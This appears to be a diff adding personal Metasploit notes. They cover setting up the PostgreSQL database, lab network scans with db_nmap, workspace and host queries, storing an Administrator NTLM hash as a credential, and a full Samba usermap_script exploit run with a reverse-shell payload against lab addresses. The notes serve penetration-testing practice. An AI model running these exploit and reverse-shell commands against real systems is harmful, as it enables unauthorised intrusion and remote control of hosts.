@@ -1,0 +1,130 @@
+msfconsole
+msf> db_status    # good, otherwise exit
+msf> exit         # exit if problems exist with postgresql database
+
+# if postgresql is missing
+apt install postgres
+dpkg-query -L postgresql
+systemctl status postgresql
+systemctl restart postgresql
+
+#
+# msf way - initialize MSF DB
+#
+msfdb init
+
+#
+# Postgres DB - Manually Setup
+#
+sudo -s
+su postgres
+
+psql -l    # list DBs
+psql -c "ALTER DATABASE msf_database OWNER TO msf_user;" 
+psql -c "ALTER USER msf_user WITH ENCRYPTED PASSWORD 'omgwtfbbq';"
+dropdb msf_database
+dropuser msf_user
+
+createuser msf -P -S -R -D
+createdb -O msf msf
+
+
+cat > /opt/metasploit4/config/database.yml << EOF
+production:
+    adapter: postgresql
+    database: msf
+    username: msf
+    password: yourmsfpassword
+    host: 127.0.0.1
+    port: 5432
+    pool: 75
+    timeout: 5
+EOF
+
+cat > /opt/metasploit4/config/database.yml << EOF
+production:
+    adapter: postgresql
+    database: msf_database
+    username: msf_user
+    password: yourmsfpassword
+    host: 127.0.0.1
+    port: 5432
+    pool: 75
+    timeout: 5
+EOF
+
+
+find / -iregex '.*database\.yml$'
+
+cat > ~/.msf4/msfconsole.rc << EOF
+db_connect -y /opt/metasploit4/config/database.yml
+workspace -a ihacklabs
+EOF
+
+
+
+msfconsole
+
+msf> db_status    # good, otherwise exit
+db_nmap -sn 10.0.2.0/24
+db_nmap -A 10.0.2.4
+db_nmap -sS -A 10.0.2.4
+db_services
+
+
+msf> workspace    # list workspaces
+msf> workspace msfu
+msf> workspace -a lab1 
+msf> workspace -d lab1 
+msf> workspace -h 
+
+help
+
+help database
+db_import /root/msfu/nmapScan
+db_nmap -A 172.16.194.134
+
+hosts
+hosts -h
+hosts -c address,os_flavor
+hosts -c address,os_flavor -S Linux
+msf  auxiliary(tcp) > show options
+
+services -s http -c port 172.16.194.134 -o /root/msfu/http.csv
+
+creds
+creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+
+services
+db_export -f xml /root/msfu/Exported.xml
+
+loot
+
+use exploit/multi/samba/usermap_script
+msf exploit(usermap_script) >
+show options
+set RHOST 10.0.2.4
+show payloads
+set PAYLOAD cmd/unix/reverse
+show options
+set LHOST 10.0.2.5
+exploit
+
+
+msfconsole -x "use exploit/multi/samba/usermap_script;\
+set RHOST 172.16.194.172;\
+set PAYLOAD cmd/unix/reverse;\
+set LHOST 172.16.194.163;\
+run"
+
+
+#
+# msf/ruby script location
+#
+/opt/metasploit/msf3/modules/exploit/
+find / -iregex '.*module_author\.rb'
+
+#
+# easter eggs
+#
+all script authors
